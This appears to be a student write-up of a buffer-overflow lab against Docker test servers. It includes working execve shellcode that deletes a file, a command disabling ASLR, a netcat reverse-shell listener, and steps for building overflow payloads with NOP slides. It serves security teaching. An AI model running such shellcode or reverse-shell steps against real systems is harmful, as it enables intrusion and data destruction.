# Task 1: Get Familiar with the Shellcode

Move into the directory "shellcode", create first a file called "remove.txt", and put this content in the shellcode_32.py program for the shellcode variable:

```python
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/rm remove.txt                                        *
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```
Then, run:

```console
$ ./shellcode_32.py
$ make
$ ./a32.out
```

And you will see that the file will be removed.

# Task 2: Level-1 Attack

Make always sure that you run the following command to disable the address randomization countermeasure enable by default in every OS:

```console
$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

Then, after building and starting all the Docker containers (as explained in the Readme.pdf file), send from the attacker machine a request to the server 10.9.0.5 at the port 9090 using netcat:

```console
$ echo hello | nc 10.9.0.5 9090
```

Substitute the values of EBP and BUF variables inside the file exploit.py in the attacker-code folder using the values returned by the target container, execute that file, open a new shell and start to listen at the port 9090 using netcat in order to reverse the shell and communicate with the server 10.9.0.5 (if running with the "-l" option, becomes a TCP server that listens for a connection on the specified port):

```console
$ nc -nv -l 9090
```

Finally, use netcat to send to the server the created badfile that will overflow the stack of the function bof used by the server, injecting a new return address that will point to the code that reverse the shell:

```console
$ cat badfile | nc 10.9.0.5 9090
```

# Task 3: Level-2 Attack

We know these facts:

- We can put the shellcode at the end of the overwritted data.

- Buffer as size between 100 and 300.

- The address of the buffer.

In order to change the execution flow of the stack program, we can overwrite all content in the positions inside Badfile between 100 and 300 with the possible shellcode address, while leave the NOP instruction in all the others positions. The new return address that points to the shellcode should be lower than the shellcode address, and bigger than the possible buffer size (maximum 300). In this way, even if the address is not exact, the NOP instructions slide the pointer until a code is found in a cell of memory, that is, our shellcode. Badfile construction is made by exploit-L2.py, the rest of the attack is conducted in the same way as in the previous task.

# Task 4: Level-3 Attack

Since the zeros posed at the end of every address stop the copy during the execution of strcpy function, everything after the return address will not be copy, so we have to change the position of the shellcode. Solution: put the shellcode just below the return address pointer and use as return address the one of the buffer. In this way, the shellcode will be for sure copied on the buffer and executed thanks to the return address and NOP slide instructions.

# Task 5: Level-4 Attack

Since now the buffer size is much smaller (80 bytes) than the shellcode length (165 bytes), we exploit the following facts:

* Function stacks frames are stored from the higher addresses to the lower addresses when invoked, so the main stack frame is the higher one.

* The main in the stack program invokes two nested functions: dummy_function which invokes bof function.

* When the stack program is executed, first store the input in a variable called str that is passed to dummy_function and then to bof function.

So, also inside the str function we have our badfile stored with our shellcode. Using as return address the address of the buffer + 1500 we can reach the str variable inside the main stack frame from the bof stack frame, and the NOPs slide the pointer towards the shellcode.

# Task 6: Experimenting with the Address Randomization (optional)

*In your report, please report your observation, and explain why ASLR makes the buffer-overflow attack more difficult*: sending multiple messages with Address Space Layout Randomization (ASLR) countermeasure turned on, we note the following:

* sending messages to 10.9.0.5 server, the ebp inside the bof function and the buffer address will change every time. However, the first two hexadecimal characters remain the same always with value "ff". The remaining 6 characters change, with 16<sup>6</sup> = 16777216 possible combinations.

* sending messages to 10.9.0.7 server, the rbp inside the bof function and the buffer address will change every time. However, the first eight hexadecimal characters remain the same always with value "00007fff". The remaining 8 characters change, with 16<sup>8</sup> = 4294967296 possible combinations.

# Tasks 7: Experimenting with Other Countermeasures (optional)

## Task 7.a: Turn on the StackGuard Protection

The program crashes, saying:

```console
...
*** stack smashing detected ***: terminated
Annullato (core dump creato)
```

## Task 7.b: Turn on the Non-executable Stack Protection

The program crashes, saying:

```console
...
Errore di segmentazione (core dump creato)
```

# Debug the stack program with gdb peda

Create a new Makefile for the server code in which we disable all the mitigations and enable the compilation with the debugging option -g (see Makefile inside server-code-debug folder), then run:

```console
$ make
```

After that, debug the stack-L4.out, stack-L3.out, stack-L2.out and stack-L1.out binary files with -q (option that allow to read from a binary file) and execute the following commands for each of the two executables:

```console
$ gdb -q stack-L?
$ b bof
$ pattern create 2000 input
$ r < input
$ p $ebp
$ p &buffer
```

Notice that the bof function inside the stack program use 3 local variables. For example 180 bytes are used to store the buffer (as in L2 attack), 4 + 4 bytes are used for the other two local variables, so the base pointer ebp address is situated after 188 bytes from the buffer's address, specifically at distance equal to 192.

